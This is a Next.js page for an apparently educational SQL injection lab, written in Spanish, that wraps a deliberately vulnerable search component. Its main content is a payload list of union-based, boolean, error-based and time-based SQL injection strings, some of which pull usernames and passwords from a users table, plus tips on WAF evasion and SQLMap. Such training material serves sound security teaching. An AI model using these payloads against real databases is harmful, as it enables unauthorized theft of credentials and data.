import VulnerableSearch from '@/app/components/VulnerableSearch';
import Link from 'next/link';

export default function SQLiSearchPage() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-blue-900">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6">
          <Link href="/" className="text-blue-400 hover:text-blue-300 flex items-center font-medium transition-colors duration-300">
            ← Volver al inicio
          </Link>
        </div>

        <div className="text-center mb-12">
          <h1 className="text-5xl font-bold bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent mb-4">
            SQL Injection - Data Extraction
          </h1>
          <div className="flex justify-center items-center mb-4">
            <div className="h-px bg-gradient-to-r from-transparent via-blue-500 to-transparent w-64"></div>
          </div>
          <p className="text-xl text-gray-300 max-w-2xl mx-auto">
            Domina técnicas avanzadas de extracción de datos mediante SQL injection en formularios de búsqueda
          </p>
          <p className="text-lg text-blue-400 font-semibold bg-blue-900/20 border border-blue-500/30 rounded-lg p-3 max-w-2xl mx-auto mt-4">
            🔍 LABORATORIO DE EXTRACCIÓN DE DATOS
          </p>
        </div>

        <VulnerableSearch />

        <div className="mt-16 max-w-6xl mx-auto">
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-blue-500/30 mb-8">
            <h2 className="text-3xl font-bold text-white mb-8 flex items-center">
              <span className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center mr-4">
                ⚡
              </span>
              Arsenal de Payloads SQL Injection
            </h2>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
              <div className="bg-gray-700/50 rounded-xl p-6 border border-red-500/30">
                <h3 className="text-xl font-bold mb-4 text-red-400 flex items-center">
                  <span className="w-6 h-6 bg-red-600 rounded-lg flex items-center justify-center mr-2 text-sm">🔗</span>
                  Union-based SQL Injection
                </h3>
                <div className="space-y-3">
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">' UNION SELECT id, username, password, email FROM users --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' UNION SELECT 1,2,3,4 --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">' UNION SELECT null, concat(username,':',password), null, null FROM users --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">' UNION SELECT table_name, column_name, null, null FROM information_schema.columns --</p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-700/50 rounded-xl p-6 border border-orange-500/30">
                <h3 className="text-xl font-bold mb-4 text-orange-400 flex items-center">
                  <span className="w-6 h-6 bg-orange-600 rounded-lg flex items-center justify-center mr-2 text-sm">🎯</span>
                  Boolean-based Blind
                </h3>
                <div className="space-y-3">
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' OR 1=1 --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' OR '1'='1</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' OR 'a'='a' --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">&apos; AND (SELECT LENGTH(database()))&gt;5 --</p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-700/50 rounded-xl p-6 border border-purple-500/30">
                <h3 className="text-xl font-bold mb-4 text-purple-400 flex items-center">
                  <span className="w-6 h-6 bg-purple-600 rounded-lg flex items-center justify-center mr-2 text-sm">💥</span>
                  Error-based Injection
                </h3>
                <div className="space-y-3">
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">' AND EXTRACTVALUE(1, CONCAT(':', (SELECT database())))--</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">' AND (SELECT COUNT(*) FROM information_schema.tables) --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">' AND UPDATEXML(1,CONCAT('~',(SELECT version())),1) --</p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-700/50 rounded-xl p-6 border border-green-500/30">
                <h3 className="text-xl font-bold mb-4 text-green-400 flex items-center">
                  <span className="w-6 h-6 bg-green-600 rounded-lg flex items-center justify-center mr-2 text-sm">⏰</span>
                  Time-based Blind
                </h3>
                <div className="space-y-3">
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' OR SLEEP(5) --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' UNION SELECT SLEEP(5) --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm">' AND IF(1=1,SLEEP(5),0) --</p>
                  </div>
                  <div className="bg-gray-800/70 p-3 rounded-lg">
                    <p className="text-gray-300 font-mono text-sm break-all">&apos; AND IF((SELECT LENGTH(database()))&gt;5,SLEEP(3),0) --</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <div className="bg-gradient-to-r from-yellow-900/30 to-orange-900/30 backdrop-blur-sm rounded-xl p-6 border border-yellow-500/30">
              <h4 className="text-xl font-bold mb-4 text-yellow-400 flex items-center">
                <span className="w-8 h-8 bg-yellow-600 rounded-lg flex items-center justify-center mr-3">
                  🎓
                </span>
                Técnicas Avanzadas
              </h4>
              <ul className="space-y-3 text-gray-300">
                <li className="flex items-start">
                  <span className="text-yellow-400 mr-2 mt-1">•</span>
                  <span><strong className="text-yellow-300">Schema Discovery:</strong> Enumera tablas y columnas mediante information_schema</span>
                </li>
                <li className="flex items-start">
                  <span className="text-yellow-400 mr-2 mt-1">•</span>
                  <span><strong className="text-yellow-300">Stacked Queries:</strong> Ejecuta múltiples consultas SQL separadas por ;</span>
                </li>
                <li className="flex items-start">
                  <span className="text-yellow-400 mr-2 mt-1">•</span>
                  <span><strong className="text-yellow-300">Filter Bypass:</strong> Evade WAFs usando encoding y técnicas de obfuscación</span>
                </li>
                <li className="flex items-start">
                  <span className="text-yellow-400 mr-2 mt-1">•</span>
                  <span><strong className="text-yellow-300">Blind Enumeration:</strong> Extrae datos byte por byte sin output directo</span>
                </li>
              </ul>
            </div>

            <div className="bg-gradient-to-r from-blue-900/30 to-cyan-900/30 backdrop-blur-sm rounded-xl p-6 border border-cyan-500/30">
              <h4 className="text-xl font-bold mb-4 text-cyan-400 flex items-center">
                <span className="w-8 h-8 bg-cyan-600 rounded-lg flex items-center justify-center mr-3">
                  💡
                </span>
                Tips de Pentesting
              </h4>
              <div className="space-y-4 text-gray-300">
                <div className="bg-cyan-900/20 border border-cyan-500/30 rounded-lg p-3">
                  <p className="text-sm">
                    <strong className="text-cyan-300">Observación:</strong> Las consultas SQL se muestran en pantalla para fines educativos.
                    En un pentest real, estas no estarían visibles.
                  </p>
                </div>
                <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-3">
                  <p className="text-sm">
                    <strong className="text-blue-300">Metodología:</strong> Comienza con payloads simples y escala gradualmente
                    a técnicas más complejas según la respuesta del sistema.
                  </p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/30 rounded-lg p-3">
                  <p className="text-sm">
                    <strong className="text-purple-300">Automatización:</strong> Utiliza herramientas como SQLMap para
                    automatizar la detección y explotación de estas vulnerabilidades.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}